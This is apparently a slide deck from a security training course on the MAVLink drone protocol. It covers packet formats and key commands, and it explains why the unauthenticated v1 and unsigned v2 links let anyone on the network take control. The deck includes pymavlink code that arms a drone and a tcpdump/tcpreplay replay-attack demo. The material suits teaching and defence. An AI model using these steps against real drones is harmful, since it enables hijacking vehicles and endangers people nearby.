# MAVLink Telemetry for Command and Control

**Type:** Presentation
**Duration:** 30 minutes
**Section:** Day 2 – RF Communications

---

## Objectives

- Understand the MAVLink protocol structure and message types
- Compare MAVLink v1 and v2 security models
- Identify attack techniques: eavesdropping, replay, and injection
- Know the tools for interacting with and analyzing MAVLink

---

## What is MAVLink?

> MAVLink (Micro Air Vehicle Link) is a lightweight messaging protocol for communicating with drones and between onboard components.

- Designed in 2009 by Lorenz Meier (ETH Zürich) for the Pixhawk project
- Binary protocol (not XML or JSON) — optimized for low-bandwidth links
- Runs over: UART, USB serial, UDP, TCP, WebSocket
- Default GCS UDP port: **14550**
- Default companion computer port: **14551**

**Supported by:** ArduPilot, PX4, DJI (partially), iNAV, Betaflight

---

## MAVLink v1 Message Structure

```
| Magic | Length | Sequence | SysID | CompID | MsgID | Payload | CRC |
|  0xFE |  1 byte|  1 byte  | 1 byte| 1 byte | 1 byte| N bytes | 2 B |
```

| Field | Size | Description |
|-------|------|-------------|
| Magic | 1 B | Start byte: `0xFE` |
| Length | 1 B | Payload length in bytes |
| Sequence | 1 B | Packet sequence number (0–255) |
| System ID | 1 B | Sending system (1 = autopilot) |
| Component ID | 1 B | Sending component (1 = flight controller) |
| Message ID | 1 B | Identifies the message type |
| Payload | 0–255 B | Message-specific data |
| Checksum | 2 B | CRC-16/MCRF4XX |

**Total overhead:** 8 bytes per packet

---

## MAVLink v2 Message Structure

```
| Magic | Length | IFlags | CFlags | Seq | SysID | CompID | MsgID  | Payload | CRC | [Sig] |
| 0xFD  | 1 byte | 1 byte | 1 byte | 1 B | 1 B   | 1 B    | 3 bytes| N bytes | 2 B | 13 B  |
```

**New in v2:**
- Magic byte changed to `0xFD`
- Message ID expanded to **3 bytes** (supports 16M message types)
- **Incompatibility Flags** and **Compatibility Flags**
- Optional **signature** field (13 bytes): link ID (1B) + timestamp (6B) + HMAC-SHA256 truncated (6B)
- Supports **message signing** for authentication

---

## Common MAVLink Messages

| Message | Direction | Purpose |
|---------|-----------|---------|
| `HEARTBEAT (#0)` | Both | Keep-alive; identifies system type and state |
| `SYS_STATUS (#1)` | FC → GCS | Battery, load, sensors status |
| `SYSTEM_TIME (#2)` | FC → GCS | GPS time |
| `ATTITUDE (#30)` | FC → GCS | Roll, pitch, yaw, rates |
| `GLOBAL_POSITION_INT (#33)` | FC → GCS | GPS lat/lon/alt + velocity |
| `RC_CHANNELS (#65)` | FC → GCS | RC input channel values |
| `MANUAL_CONTROL (#69)` | GCS → FC | Joystick inputs |
| `COMMAND_LONG (#76)` | GCS → FC | Send a command with parameters |
| `MISSION_ITEM (#39)` | GCS → FC | Upload a waypoint |
| `MISSION_REQUEST (#40)` | FC → GCS | Request a waypoint |
| `PARAM_VALUE (#22)` | FC → GCS | Parameter value |
| `PARAM_SET (#23)` | GCS → FC | Set a parameter |
| `STATUSTEXT (#253)` | FC → GCS | Human-readable status message |

---

## Critical COMMAND_LONG Commands

`COMMAND_LONG (#76)` is the general-purpose command message:

| MAV_CMD | ID | Description |
|---------|-----|-------------|
| `MAV_CMD_COMPONENT_ARM_DISARM` | 400 | Arm or disarm motors |
| `MAV_CMD_DO_SET_MODE` | 176 | Change flight mode |
| `MAV_CMD_NAV_TAKEOFF` | 22 | Autonomous takeoff |
| `MAV_CMD_NAV_LAND` | 21 | Autonomous landing |
| `MAV_CMD_NAV_RETURN_TO_LAUNCH` | 20 | RTL |
| `MAV_CMD_OVERRIDE_GOTO` | 252 | Override mission (goto or hold) |
| `MAV_CMD_DO_SET_RELAY` | 181 | Toggle a relay pin |
| `MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES` | 520 | Get firmware info |

---

## MAVLink Security Issues

### No Authentication (v1)

In MAVLink v1, **any device** that can send UDP packets to port 14550 can:
- Read all telemetry (no confidentiality)
- Send any command to the flight controller
- Change parameters
- Upload waypoints / missions
- Arm or disarm the drone

**Required knowledge:** the target's IP address and port (usually trivially discoverable via `nmap`)

### Weak Identity (v1 and v2)

- System ID is 1 byte — any value 1-255
- A GCS is expected to use a higher system ID (e.g., 255)
- The flight controller accepts commands from **any** system ID by default
- `SYSID_MYGCS` parameter restricts accepted system IDs — but defaults to 255 (wildcard behavior)

### Replay Attacks (v1)

- Sequence numbers roll over at 255 — no unique packet identification
- Capturing a command sequence and replaying it sends the same commands again
- Example: capture an arming sequence, replay → drone arms

### Weak Authentication (v2 Optional Signing)

- Signing is optional and rarely deployed
- If not enabled, v2 is no more secure than v1 in practice

---

## MAVLink Tools

### MAVProxy

Command-line GCS and MAVLink proxy:

```bash
# Connect over UDP
mavproxy.py --master=udp:10.1.1.10:14550

# Connect over SiK radio
mavproxy.py --master=/dev/ttyUSB0 --baud=57600

# Useful commands:
MAV> status          # Vehicle status
MAV> mode GUIDED     # Change mode
MAV> arm throttle    # Arm (requires pre-arm checks passing)
MAV> disarm          # Disarm
MAV> param show FS_* # Show failsafe params
MAV> wp list         # List mission
```

### pymavlink (Python Library)

```python
from pymavlink import mavutil

# Connect
conn = mavutil.mavlink_connection('udp:10.1.1.10:14550')
conn.wait_heartbeat()

# Send a command
conn.mav.command_long_send(
    conn.target_system,
    conn.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
    0,    # confirmation
    1,    # param1: 1=arm, 0=disarm
    0, 0, 0, 0, 0, 0
)
```

### Wireshark

MAVLink dissector is built into Wireshark:

```bash
# Capture MAVLink traffic
sudo tcpdump -i any udp port 14550 -w mavlink.pcap

# Open in Wireshark
wireshark mavlink.pcap

# Filter: mavlink_proto
# You can see all message fields decoded
```

---

## MAVLink Replay Attack (Demo)

```bash
# 1. Capture a mode change command with tcpdump
sudo tcpdump -i wlan0 udp port 14550 -w mode-change.pcap

# (In another terminal, use MAVProxy to send a mode change)
MAV> mode LOITER

# 2. Stop capture, inspect in Wireshark — find the COMMAND_LONG packet

# 3. Replay the captured packet
tcpreplay --intf1=wlan0 mode-change.pcap
# The drone will receive the mode-change command again
```

---

## Summary

| Topic | v1 | v2 |
|-------|----|----|
| Encryption | None | None (external transport only) |
| Authentication | None | Optional HMAC signing |
| Message ID | 1 byte (256 types) | 3 bytes (16M types) |
| Replay protection | None | Timestamp in signature |
| Adoption | Widely deployed | Growing — not universal |

**Bottom line:** MAVLink without signing is an unauthenticated control protocol. In a default drone deployment, any device on the network can take full control of the drone.
